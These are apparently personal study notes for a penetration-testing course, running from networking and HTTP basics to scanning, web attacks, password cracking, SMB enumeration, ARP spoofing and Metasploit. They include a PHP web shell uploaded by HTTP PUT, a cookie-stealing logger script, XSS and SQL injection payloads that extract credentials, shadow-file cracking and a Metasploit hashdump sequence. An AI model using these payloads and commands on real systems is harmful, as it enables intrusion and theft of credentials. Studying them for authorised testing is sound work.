# PTS 📝

## 1.2 Networking 🌐

* 0.0.0.0 - 0.255.255.255 : this network
* 127.0.0.0 - 127.255.255.255 : local host
* 192.168.0.0 - 192.168.255.255 : private networks

[Special Use IPv4 RFC](https://www.rfc-editor.org/rfc/rfc5735#section-4)

Network & Broadcast addresses technically extinct from [Variable Length Subnet](https://www.rfc-editor.org/rfc/rfc1878)

Network Calculators:
* [Subnet Calc](https://www.subnet-calculator.com/)
* [CIDR Calc](https://www.subnet-calculator.com/cidr.php)

0.0.0.0 is default route and needed for otherwise unroutable packets

Switches can only segment networks via VLANs (tagging)
Routers can segment networks

MAC cache is formally known as Content Addressable Memory (CAM) table
Switches learn MAC addresses dynamically and those eventually go stale
Network maintains routes

FF:FF:FF:FF:FF:FF is the MAC broadcast address

* [IANA Port Registry](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)

21 :    FTP  
22 :    SSH  
23 :    Telnet  
25 :    SMTP  
80 :    HTTP  
110 :   POP3  
115 :   SFTP  
137 :   NETBIOS (UDP)  
138 :   NETBIOS (UDP)  
139 :   NETBIOS (TCP)  
143 :   IMAP  
443 :   HTTPS  
1433 :  MS SQL Server  
3306 :  MySQL  
3389 :  RDP  
5985 : WinRM

Firewalls:
* Allow : packets route
* Drop  : packets dropped WITHOUT notification
* Deny  : packets dropped WITH notification

Domain (DNS), from right to left (backwards):
* Top-level domain (TLD)
* domain
* subdomain (optional)
* host

[Domain Concepts RFC](https://www.ietf.org/rfc/rfc1034.txt)  
[Domain Specification RFC](https://www.ietf.org/rfc/rfc1035.txt)

* Promiscuous mode puts a Network Interface Card (NIC) into a mode that accepts all packets, even those not destined for the host

[Wireshark Filter Reference](https://www.wireshark.org/docs/dfref/)

## 1.3 Web Apps 🌍

### HTTP Basics 📨

[HTTP Message Format](https://www.rfc-editor.org/rfc/rfc9110.html)

```
<HTTP_VERB> <PATH> <PROTOCOL_VERSION>\r\n
<HEADERS>\r\n
\r\n
Message Body\r\n
```

Where, `<HTTP_VERB>` can be GET, PUT, TRACE, HEAD, POST, DELETE, and more!

Where, `<HEADERS>` is in the key-value format and separated by `\r\n`.

```
Header-name: header-value
```

#### Request Headers

* Host : [URI](https://www.w3.org/TR/uri-clarification/) ; useful for a server that hosts multiple websites
* User-Agent : tells browser, OS, web engine, etc. versions
* Accept : document type (e.g. `text/html`)
* Accept-Language : human language localization
* Accept-Encoding : content encoding (e.g. compression)
* Connection : connection options

#### Response Headers

```
<PROTOCOL_VERSION> <HTTP_STATUS_CODE> <HTTP_TEXTUAL_MEANING>
<HEADERS>\r\n
\r\n
<PAGE_CONTENT>
```

* Date : response timestamp
* Cache-Control : set cache policy ; prevents re-requesting unmodified content
* Content-Type : response type (analogous to `Accept` header from request)
* Content-Encoding : response encoding (analogous to `Accept-Encoding` from request)
* Server : identify service (e.g. Apache, nginx, etc.)
* Content-Length : length of <PAGE_CONTENT> in Bytes

##### Status Codes

* 200 OK : good request
* 301 Moved Permanently : resource requests has been moved permanently
* 302 Found : resource exists under a different URI
* 403 Forbidden : client does not have enough privileges
* 404 Not found : server cannot find requested resource
* 500 Internal Server Error : server lacks the capability to handle the request

### HTTPS (HTTP with SSL/TLS) 🔒

Only protects against HTTP traffic interception, but not server exploits  
[SSL/TLS Guide by Apache](https://httpd.apache.org/docs/2.2/ssl/ssl_intro.html)

### Cookies 🍪

HTTP is stateless, which means the server does not keep track of requests.  
[Cookies](https://www.rfc-editor.org/rfc/rfc6265) are needed and used to maintain state between requests (i.e. maintain a "logged in" status). These are sent in the header as seen below:

Response format:

* Set-Cookie: content ; expiration date ; path ; domain ; optional flags (e.g. HttpOnly, Secure, etc.)

Request format:

* Cookie: " ... "

If `domain` is unset, then it will be automatically set by the server's domain and sets the cookie "host-only" flag, which means that cookie will be sent only to that exact hostname

Scope of a cookie is set by the `path` and `domain` attributes

Cookie path is recursively inclusive downwards (but not upwards)

"http-only" flag allows only HTML technology to read the cookie but not JavaScript, Flash, Java, etc. and prevents XSS

"Secure" flag only sends cookies over HTTPS

Typically, cookies are installed from a user login

### Sessions 🗝️

Session cookies store state on the server side via a "session ID" or token. These can replace a normal cookie (which prevents storing data on the client's side).

* SESSION : session cookie
* PHPSESSID : PHP session cookie
* JSESSIONID : JavaScript cookie

### Same Origin Policy 🚧

Prevents JavaScript from getting/setting properties on a resource from a different origin via. The browser must match all of the following in order to allow JS to change a resource:

* Protocol
* Hostname
* Port

i.e. protocol://hostname:port

HTML can still include external resources (just not JS if SOP is enabled)

## MITM Proxies (tools) 🕵️

* [Burp suite](https://portswigger.net/burp)
  - Can crawl an entire website
  - Modify HTTP requests and responses
* [OWASP ZAP](https://owasp.org/www-project-zap/)

## 1.4 PenTesting 🛡️

### Lifecycle 🔄

1) Engagement

- Get all details, including boundaries, dates, etc., during this phase
- Quotation: defines the fee for the work
  - type of engagement (black, grey, white box)
  - time billed
  - complexity of applications and services
  - scope: number of targets (IP address, domains, etc.)
  - total cost
  - a **lawyer** and/or **professional insurance** may be necessary
- Proposal: understand clients requirements and constraints along with the approach to achieve this (automated/manual testing)
  - Word this in terms of **risks and benefits** (business continuity, improved data/info confidentiality, avoidance of money/reputation loss
- Non-Disclosure Agreement (NDA): protects sensitive information encountered
- Rules of Engagement: time window, contacts/POCs, goals/objectives

2) Info Gathering

- do **NOT** start before time window
- Business info (names and emails):
  - board of directors
  - investors
  - managers and employees
  - locations and addresses
- Infrastructure info:
  - transform IP address/domains to servers/OS + more
  - (sub)domains; webpages (website crawling); technologies like PHP, Java, .NET; frameworks/content managers like Drupal, Joomla, Wordpress

3) Footprinting and Scanning

- ID OSes, services, and their versions
- detect hosts -> port scan via [nmap](https://nmap.org/)

4) Vulnerability Assessment

- discern list of vulnerabilities per target
- CAUTION: narrow down vulnerability scans (by OS, ports, etc.) to prevent service crashing and runtime

5) Exploitation

- validate previously found vulns via exploitation

6) Reporting

- share results with:
  - executives
  - IT staff
  - dev team
- report items:
  - techniques used
  - vulnerabilities found
  - exploits used
  - impact and risk analysis for each vuln
  - remediation tips  <==== **REAL VALUE FOR CLIENT**
    - **USEFUL SUGGESTION/TECHNIQUES** are more valuable than exploitation skills
- save report in encrypted location or destroy all work data
- stick to the process to maintain organization and focus while not freaking out

### Report Template 📝

```
Categorization
  - Title
  - Assignee
  - Finding Type
  - Severity
  - CVSS Score v3.0
  - CVSS Vector v3.0
Affected Entities (IP, URL, etc.)
General Information
  - Description
  - Impact
Defense
  - Mitigation
  - Replication Steps
  - Host Detection Techniques
  - Network Detection Techniques
Reference Links
```

## 2.1 C++ 💻

### Basics

```c++
#include <iostream>
using namespace std; // prevent needing std:: everywhere
cout << "hi there" << endl; // prints output
cin >> variable_name ; // get user input

cin.ignore(); // keep console open (may need 2)
```

### Pointers

By default, C++ uses **call by value**.
Other languages might use **call by reference**.

```c++
type *variable_name;

x = &y; // store pointer location
x = *y; // store pointer value
```

## 2.2 Python3 🐍

Socket example

```python
import socket

SRV_ADDR = "0.0.0.0"
SRV_PORT = 44444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)
print("Server started! Waiting for connections...")
connection, address = s.accept()
print('Client connected with address:', address)
while 1:
    data = connection.recv(1024)
    if not data: break
    #connection.sendall(b'-- Message Received --\n')
    print(data.decode('utf-8'))
connection.close()
```

## 3.1 Information Gathering 🔍

- use social networks
  - LinkedIn
  - Facebook
  - Twitter
  - Crunchbase (requires subscription)
- government contractor
  - [GSA](https://www.gsaelibrary.gsa.gov/ElibMain/home.do)
- general internet database
  - WhoIs `whois` command
- browse client's website
- tools:
  - [DNS Dumpster (DNS assocations)](https://dnsdumpster.com/)
  - [Sublist3r (subdomains)](https://github.com/aboul3la/Sublist3r)

## 3.2 Footprinting and Scanning 🕵️‍♂️

1) Figure out IP address space range
2) Enumerate live hosts via [ICMP](https://www.rfc-editor.org/rfc/rfc792) ping sweep (Type 8 - echo request) ; usually blocked but maybe not inside of the LAN

### `fping`

```shell
# CIDR can be: 10.54.12.0/24 OR 10.54.12.0 10.54.12.255
fping --alive --generate <CIDR> 2>/dev/null  # generates alive target list while ignoring host unreachable
```

### `nmap`

- [Nmap Reference Guide](https://nmap.org/book/man.html)
  - [Performance tweaking](https://nmap.org/book/man-performance.html)
  - [Remote OS detection](https://nmap.org/book/osdetect.html)
- [Offline p0f Fingerprinting](https://lcamtuf.coredump.cx/p0f3/)
- Maybe promising: https://github.com/scipag/vulscan
  - https://github.com/apathetics/Ethical-Hacking-Final-Project/blob/master/myScript.py

```shell
# <CIDR> can be: 10.54.12.0/24 OR 10.54.12.1-12 OR 10.54.12.* OR 10.54.12-13.* OR 10.14.33,34,35.1,3,17
nmap -sn <CIDR>  # ping scan only
# -iL <FILE> : file listing of IP addresses

nmap -O <CIDR>  # OS fingerprinting scan ; will ping first without "-Pn"

# GIGA SCAN
nmap -T4 -sV -O <CIDR>  # with parallelization and only hosts that are up (via ICMP Ping ; modify for non-pingable "up" hosts)

# ---

HOST DISCOVERY:
 -sL: List Scan - simply list targets to scan
 -sn: Ping Scan - disable port scan
 -Pn: Treat all hosts as online -- skip host discovery
 -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
 -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
 -PO[protocol list]: IP Protocol Ping

OUTPUT:
 -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
    and Grepable format, respectively, to the given filename.

OS DETECTION:
 -O: Enable OS detection
 --osscan-limit: Limit OS detection to promising targets
 --osscan-guess: Guess OS more aggressively

SERVICE/VERSION DETECTION:
 -sV: Probe open ports to determine service/version info
 --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
 --version-light: Limit to most likely probes (intensity 2)
 --version-all: Try every single probe (intensity 9)
 --version-trace: Show detailed version scan activity (for debugging)
```

### TCP 3-way handshake 🤝

- 3-way handshake: `SYN -> SYN+ACK -> ACK`: normal way to establish TCP connection; port is open!
- `SYN -> RST+ACK`: port is closed
- SYN scan: `SYN -> SYN+ACK -> RST`: close port before finishing 3-way handshake and avoiding logs!

**`SYN` only scans typically do not leave logs!**

### Scan Types 🔍

- `-sT`: TCP connect scan (3-way handshake)
  - **logs in application/service logs**
- `-sS`: SYN scan (stealth scan)
  - still detectable by good IDS, but usually not service
- `-sV`: service version detection scan
  - uses `-sT` with other probes so **it logs and it's loud**
- `-p <PORT_RANGE>`: scan port(s)

## 3.3 Vulnerability Assessment 🛠️

- if doing vuln assessment only, then this is a linear process without feedback (via exploitation and cycling) where those vulns cannot be confirmed

### Example Scanners 🧰

- [OpenVAS](https://www.openvas.org/)
- [Nexpose](https://www.rapid7.com/products/nexpose/)
- [LanGuard](https://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard)
- [Nessus](https://www.tenable.com/products/nessus)
- [Nmap recommended top vuln scanners](https://sectools.org/tag/vuln-scanners/)

#### Nessus

- Uses a client/server model where the client configures and tasks scans while thserver performs them

## 3.4 Web App Attacks 🕸️

- big rocks:
  - web service
  - version
  - OS

### Webapp Fingerprinting Techniques 🕵️‍♀️

#### Banner grabbing

- NOTE: this works for HTTP only (not HTTPS)
- [OpenSSL[(https://www.openssl.org/)

```shell
# HTTP-only
echo -e 'HEAD / HTTP/1.0\r\n\r\n' | nc --verbose <IP_ADDRESS> <PORT>
# HTTPS (NOT GOOD)
echo -e 'HEAD / HTTP/1.0\r\n\r\n' | openssl s_client -connect <IP_ADDRESS>:<PORT>

# Signature-based fingerprinting
httprint -P0 -s /usr/share/httprint/signatures.txt -h <IP_ADDRESS>
```

- Look for `Server:` header to enumerate service + version

#### HTTP Verbs

- **DON'T FORGET the `\r\n\r\n` at the end of each request**
- **The `Host:` parameter is NOT needed for `HTTP/1.0`
- HTTP verbs sometimes depend on the `Host:` probed

- GET: pass args in the location

```shell
GET /page.php?course=ABC HTTP/1.1
Host: www.example.site
```

- POST: params must be in the message body

```shell
POST /login.php HTTP/1.1
Host: www.example.site


username=hotdog&password=abc123
```

- HEAD: similar to GET

```shell
HEAD / HTTP/1.1
Host: www.example.site
```

- PUT: upload files to server
  - must know the size of the file
  - can use `wc --chars <FILENAME>` to get file size
  - see below

```shell
PUT /path/to/destination HTTP/1.1
Host: www.example.site
Content-type: text/html
Content-length: 20


<?php phpinfo(); ?>
```

- DELETE: remove files from server
  - can be used to remove remote files

```shell
DELETE /path/to/destination HTTP/1.1
Host: www.example.site
```

- OPTIONS: enumerate all enabled HTTP verbs
  - check for `Allow:` response

```shell
OPTIONS / HTTP/1.1
Host: www.example.site
```

#### PHP Shell 🐘

- PHP Shell code for arbitrary commands
- This is less common for website, **BUT** still very common for IOT devices

##### payload.php

```shell
wc -m payload.php
# 140 payload.php
```

- HTTP request

```shell
nc www.example.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 140


<?php
if (isset($_GET['cmd']))
{
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
?>
```

##### Commands to Webshell

```shell
www.example.site/payload.php?cmd=ls
www.example.site/payload.php?cmd=echo 'hi there' > /tmp/hotdog
```

#### Dirs/Files Enumeration 📂

- 2 methods to discern possible files:
  - brute-force (very hard and lame) ; on the order of millions/billions
  - dictionary attack of common file names ; maybe only a few thousands
- [DirBuster](https://www.kali.org/tools/dirbuster/)

```shell
# Run in background w/ 100 threads and save report to file
dirbuster -t 100 -l /usr/share/dirbuster/wordlists/directory-list*medium.txt -H -r dirbuster_report.txt -u <URL>
```

## 4.5 Google Dorks 🔎

Using search engines to search for tasty resources or login areas.

- References:
  - [Google Hacking Databse (exploitdb)](https://www.exploit-db.com/google-hacking-database)
  - [Google's Programmable Search Engine](https://developers.google.com/custom-search/docs/xml_results)

### Useful search commands

- `cache:` show cached webpage
- `site:` include results from specific domains only
- `intitle:` filter from page title
- `inurl:` filter from contains in URL
- `filetype:` filters by file type
- `AND, OR, &, |` join same operators e.g. `site:derp.com OR site:dog.com`
- `-KEYWORD` filter out by KEYWORD keyword

```shell
# Search for admin logins per domain
inurl: admin intitle: login site:example.com

-inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
```

## 4.6 Cross Site Scripting (XSS) 🦠

- [XSS](https://owasp.org/www-community/attacks/xss/) happens with unfiltered user input to build the web output/content that the server should validate! **NEVER TRUST USER INPUT -- always SANITIZE**
- User input being stolen:
  - Request headers
  - Cookies
  - Form inputs
  - POST/GET parameters
- XSS requires a vuln web app, so it needs a victim to allow the exploit
- The XSS allows for malicious code to be ran on the victim's computer
- **XSS typically ignored since harmless pop-up boxes are usually used to show impact**
  - Do MORE than a pop-up box to show impact

### Find XSS

- Look at **EVERY** user input
- Find a reflection point (where input gets outputed)
- Test things such as HTML tags to see if they work
  - e.g. Search for "<i>test" and note if the "test" string is italicized to demonstrate that the input is not sanitized
  - `<script>alert('[+] SUCCESS! Vuln!')</script>`
  - `<script>alert(document.cookie)</script>`
  - Cookie stealing

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```

- Types of XSS:
  - reflected: payload is inside of the request sent by victim; input gets reflected as output
    - malicious links or phishing e.g. `victim.site/search.php?find=<PAYLOAD>`
    - Google Chrome has built-in reflected XSS filter
  - persistent: payload is sent and stored by server
    - payload is delivered every time the page is browsed
    - HTML forms that submit content to the server and show it back to the user like comments, user profiles, and forum posts
  - DOM based

## 3.4 SQL Injections (SQLi) 💉

Access backend databases that typically store creds, data, transactions, and more

### SQL General Syntax

- [SQL Reference](https://www.w3schools.com/sql/sql_intro.asp)
- Result is technically a subtable of the database/table queried

```sql
# Basic
SELECT column FROM table WHERE key='value' ;

# Unioned
SELECT x UNION SELECT y ;
```

- SQL uses `#` or `--` as comments

### SQL Examples

```sql
# return just single row
SELECT Name, Description FROM Products WHERE ID='1' ;
SELECT Name, Description FROM Products WHERE Name='Shoes' ;

# return 3rd item and all usernames and passwords
SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts ;

# return chosen data
SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT 'Example', 'Data' ;
```

### PHP w/ SQL Example

```php
$hostname='1.2.3.4';
$user='user';
$pass='pass';
$database='mydatabase';

// get query parameter from GET param 'id: blah'
$id = $_GET['id'];

$connection = mysqli_connect($hostname, $user, $pass, $database);
$query = "SELECT Name, Description FROM Products WHERE ID='$id' UNION SELECT Username, Password FROM Accounts;";

$results = mysqli_query($connection, $query);
display_results($results);
```

**TRY BOTH True AND False CONDITTIONS**
- setting `$id` to something like `' OR 'a'='a` then becomes:
  - `SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
  - which will return all `Products`
- `' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a`
  - results in creds!

- Using Burp to analyze and manipulate headers (e.g. for logins to SQLi)

### Exploiting Boolean Based SQLi

```sql
mysql> select user();
mysql> select substring('blah', 2, 1);
mysql> select substring(user(), 1, 1) = 'r';

# payload iterations start at a, b, c, ...
' OR substr(user(), 1, 1) = 'a
# once the the first letter is known, try the second at a, b, c, …
' OR substr(user(), 2, 1) = 'a
```

```sql
# extra dash is d/t some browsers removing trailing spaces and this preserves the comment
SELECT description FROM items WHERE id='' UNION SELECT user(); -- -';

# more HTTP queries to discern number of fields/columns
' UNION SELECT null; -- -
' UNION SELECT null, null; -- -
' UNION SELECT null, null, null; -- -

# SQLi examples
' UNION SELECT elsid1, elsid2; -- -
' UNION SELECT user(), elsid2; -- -
```

### SQLMap 🗺️

- Warning: SQLMAP might choose bad, automatic exploit parameters or crash services

```shell
# POST header uses '--data' option
sqlmap -u <URL> -p <INJECTION_PARAMTER> [--data=<POST_STRING>] [options]

# example: test parameter 'id:' with the UNION technique
sqlmap -u 'http://www.hotdog.com/view.php?id=1337' -p id --technique=U
```

## 3.5 System Attacks 🖥️

### Malware 🦠

- virus: code that spreads without authorization across computers
- trojan: embedded code in a seemingly harmless file
  - backdoor: background, unknown access for operator usu client/server
    - reverse/beacon: malware beacons back to operator
    - forward/connect: malware listen for connections from operator
- rootkit: hides from users and sometimes AV or kernel as well to subvert standard OS functions (syscalls)
- bootkits: embeds into bootloader
- adware: displays ads
- spyware: collects user activity such as OS version, visited websites, passwords
- greyware: malware that is not exclusive to a specific category
- dialers: antiquated malware that would dial numbers via dial-up connections to collect money from phone bills
- keylogger: collects keyboard strokes usu for creds
- bots: installed on internet-connected machines for DDOS/spam
- ransomware: encrypts computer harddrives and holds data hostage usu for ransom
- worms: exploit vulnerabilities and spread (automatically) to more hosts

### Password Attacks 🔓

- only way to reverse a hash truly is via brute-forcing (assuming the hashing algorithm does not have an exploit)

#### John the Ripper

- [John the Ripper](https://www.openwall.com/john/) is a brute-force and dictionary password cracker for many platforms
  - using a dictionary can take down the [keyspace](https://howsecureismypassword.net/) a few orders of magnitude (i.e. from billions to just millions of password possibilities)
  - [Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
    - or: `sudo apt install -y seclists` for wordlists in `/usr/share/seclists/Passwords/`

```shell
# Get list of possible cracking formats
john --list=formats

# must merge user and pass first
unshadow /etc/passwd /etc/shadow > crackme

# crack via brute-force, optionally against certain users
john -incremental [-users:<USERS>] crackme
# dictionary attack, rules will do some basic mangling
john -wordlist=/usr/share/john/password.lst [-rules] [-users:<USERS>] crackme

# show (cached) results
john --show crackme
```

#### ophcrack

- [ophcrack](https://ophcrack.sourceforge.io/) rainbow table cracking tool for Windows only (requires downloaded rainbow tables as well)

### Buffer Overflow Attacks 💥

- buffer: finite area in RAM for temporary data storage (e.g. user input, video, web browser responses, etc.) ; these are typically stored in a `stack` (LIFO) data structure

#### Buffer

```shell
 _____________________
| Vars
|_____________________|
| Base Pointer
|_____________________|
| Return Address
|_____________________|
| Function Parameters
|_____________________|
```

## 3.6 Network Attacks 🌐

### Authentication Cracking 🗝️

- [Password Collections](https://wiki.skullsecurity.org/index.php/Passwords) in addition to Seclists

#### Hydra

- fast, parallelized, network authentication cracker for many services

```shell
# Get detailed module info
hydra -U <MODULE>

# Launch dictionary attack using a user/pass list
hydra -L user.txt -P pass.txt <options> <service://server>
```

#### Windows Shares 🪟

- enabled through the service `File and Printer Sharing`
- NetBIOS: Windows host and share discovery (name resolution) protocol
  - 137/UDP: names, for finding workgroups
  - 138/UDP: datagrams, to list shares and machines
  - 139/TCP: session, to transmit shares data
- Windows Vista+ can have `Public` shares
- locations are UNC like `\\<SERVER>\<SHARE_NAME>\<FILE>`
- built-in administrative shares:
  - `C$`: allows admin access to local filesystem (and other volumes have their own as well)
  - `admin$`: windows installation directory
  - `ipc$`: unbrowseable via Explorer and used for process IPC

##### Null Sessions

- allows connecting to a share without authentication; only works for older Windows boxes for `IPC$` share

###### Tools

* DOS:

```shell
# Windows NetBIOS tool for host discovery/enumeration
nbtstat -A <IP_ADDRESS>

# Records from output
<00>    : workstation
<20>    : file sharing enabled

# enumerate shares
net view <IP_ADDRESS>

# Null session
net use \\<IP_ADDRESS>\IPC$ '' /u:''
```

* Linux: using the [Samba](https://www.samba.org/) tool suite

```shell
# nbtstat equivalence
nmblookup -A <IP_ADDRESS>

# Enumerate shares ; '-N' is do not ask for password
smbclient -L -N //<SERVER>

# Null session
smbclient -N //<SERVER>/IPC$
```

* [Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files): additional Windows program to enumerate shares, users, and policy via null session

```shell
# Shares
enum -S <IP_ADDRESS>

# Users
enum -U <IP_ADDRESS>

# Password policy
enum -P <IP_ADDRESS>
```

* [Winfo](https://packetstormsecurity.com/search/?q=winfo&s=files): another Windows tool for similar

```shell
winfo -n <IP_ADDRESS>
```

* [Enum4linux](https://github.com/CiscoCXSecurity/enum4linux): Linux tool

#### ARP Poisoning 🧪

- manipulating the ARP cache for a device (usu router) to intercept certain traffic destined for a different host via gratuitous (unsolicited) ARP replies every 30 seconds or so

##### Dsniff arpspoof

- [dsniff](https://www.monkey.org/~dugsong/dsniff/): must enable IP packet forwarding

```shell
echo 1 > /proc/sys/net/ipv4/ip_forward
```

* arpspoof

```shell
# use tun interface if on VPN
arpspoof -i <NIC_INTERFACE> -t <TARGET> -r <HOST>
```

#### Metasploit 💣

- [Metasploit](https://www.metasploit.com/): exploit framework

```shell
# Start metasploit
msfconsole

# Search for module
search <KEYWORD>[, <KEYWORD>, …]

# show exploits
show exploits

use <EXPLOIT>
info
show options
set <KEY> <VALUE>
show payloads
set payload <PAYLOAD>

exploit

background
sessions -l
sessions -i <SESSION_ID>

sysinfo
ifconfig
route
getuid
getsystem  # doesn't work on modern Windows
bypassuac  # maybe works on modern Windows ; then rerun getsystem

use post/windows/gather/hashdump
```

#### Meterpreter 🦾

- power shell payload for many platforms that can be launched via Metasploit
  - `bind_tcp`: connect payload
  - `reverse_tcp`: reverse callback payload